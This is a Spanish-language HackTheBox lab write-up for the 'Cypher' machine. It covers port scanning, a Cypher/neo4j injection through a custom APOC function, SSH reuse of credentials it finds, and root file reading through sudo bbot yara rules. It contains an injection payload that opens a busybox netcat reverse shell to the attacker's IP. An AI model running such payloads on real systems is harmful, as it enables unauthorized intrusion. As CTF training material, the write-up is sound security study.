---
title: Cypher - HackTheBox Season 7
date: 2025-03-09 11:00:00 +0000
layout: post
permalink: /writeups/HTB/LABS/cypher-htb-season7
image:
  path: /assets/img/writeups/hackthebox/cypher_htb_s7/cypher.png
  alt: HackTheBox
description: >
  Guía en español para Cypher - HackTheBox Season 7
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escaneo de puertos

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-05 20:19 CET
Nmap scan report for cypher.htb (10.10.11.57)
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
No OS matches for host
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Puerto web 

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image.png)

En el portal web encontramos lo que parece una aplicación que utiliza grafos para mostrar la información sobre la superficie de ataque de un objetivo o empresa.

Si hacemos click en probar el demo nos redirige a un portal para iniciar sesión.

Probando inyección básica para probar el login vemos lo siguiente:

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-1.png)

Vemos que efectivamente tenemos posibilidad de inyectar comandos en el portal web pero la base de datos (como era de esperar por la naturaleza de la aplicación) es de tipo NOSQL, es neo4j y se basa en bases de datos para grafos.

Tras un rato probando direntes inyecciones de tipo cypher no conseguí nada efectivo.

[Cypher inyections cheatsheet](https://pentester.land/blog/cypher-injection-cheatsheet/)

## Fuzzing de directorios 

Mientras tanto realizamos un fuzzing de directorios sobre la web y por suerte encontramos una ruta que parece ser interesante.

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-2.png)

Dentro encontramos un archivo `.jar` con nombre apoc-extensión que puede ser potencialemente valioso ya que se trata de una extensión utilizada por neo4j.

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-3.png)

Al abirlo en un decodificador online de jar encontramos que efectivamente se trata de un plugin para la base de datos neo4j.

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-4.png)

Dentro del código vemos una clase interesante que añade una función para hacer petciones HTTP y devuelve el estado de la misma.

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-5.png)

## Inyección cypher en neo4j

Para hacer uso de esta función customizada en la base de datos necesitamos llamarla con el prefijo `custom.` y el nombre de la función, pero antes debemos fijarnos en como toma el valor del nombre de usuario la base de datos y para esto podemos servirnos del error obtenido en Burp.

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-6.png)

Sabiendo que esto es así podemos crear el payload de inyección y probarlo.

```bash
a' return h.value as a UNION CALL custom.getUrlStatusCode("http://10.10.16.73:80;busybox nc 10.10.16.73 4444 -e /bin/bash;#") YIELD statusCode AS a RETURN a;//
```

Utilizamos la revshell con busybox ya que parece que el sistema no tiene nc por defecto o no lo tiene referenciado en el PATH.

> Dato : busybox es un binario multi-herramienta común en sistemas embebidos o con recursos limitados. Muchas distribuciones minimalistas (como routers, IoT o contenedores) no incluyen nc independiente, pero sí busybox, que integra nc entre otras utilidades.
{: .prompt-info}

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-7.png)

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-8.png)

Ahora tenemos acceso a la maquina como el usuario neo4j.

Tras un rato mirando archivos encontramos algo interesante, unas credenciales de acceso.

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-9.png)

> Nota : Este usuario no tiene privilegios para acceder a la user flag.
{: .prompt-warning}

## Acceso como usuario

Probando las credenciales encontradas con el usuario `graphasm` por ssh tenemos acceso a la maquina.

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-10.png)

### User flag

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-11.png)

## Escalada de privilegios

Haciendo una comprobación básica de permisos sudo vemos que tiene permisos root en la ejecución de cun binario llamado `bbot`.

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-12.png)

[BBot Github](https://github.com/blacklanternsecurity/bbot)

Parece que BBot es una herramienta de reoconocimiento automatizada para la exploración de vulnerabilidades en aplicaciones web.

En la wiki buscando que módulos tiene que puedan ser útiles encontramos las yara rules.

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-13.png)

Esto nos permite cargar reglas yara para buscar en el código de la aplicación web. 

El plan es indicar que la flag como root.txt es un fichero de reglas yara para que este lo cargue ya que tiene privilegios root.

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-14.png)

Parece que carga los datos del fichero pero no muestra nada de las reglas.

Buscando más información en los parámetros de uso de BBot encontramos un parámetro llamado `-d` que basicamente es igual a un clásico `--verbose`.

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-15.png)

Esto nos mostrará más información en el proceso de carga de las reglas.

> Nota : El parámetro marcado con una flecha no lo usé pero es muy útil ya que para el escaneo antes de ser ejecutado pero siempre podemos pararlo manualmente con Ctrl+C.
{: .prompt-info}

Si ahora ejecutamos el comando con el parámetro `-d` podemos ver que se está cargando el archivo de la flag como una regla yara y muestra el contenido de la misma.

```bash
sudo /usr/local/bin/bbot -cy /root/root.txt -d
```
### Root flag

![alt text](/assets/img/writeups/hackthebox/cypher_htb_s7/image-16.png)
